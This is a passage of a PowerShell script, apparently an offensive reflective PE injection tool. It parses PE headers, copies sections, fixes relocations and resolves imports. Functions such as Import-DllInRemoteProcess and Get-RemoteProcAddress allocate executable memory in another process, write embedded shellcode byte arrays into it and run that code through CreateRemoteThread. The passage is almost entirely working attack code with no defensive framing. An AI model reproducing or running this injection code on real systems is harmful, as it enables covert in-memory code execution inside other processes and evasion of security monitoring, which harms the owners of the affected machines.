		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
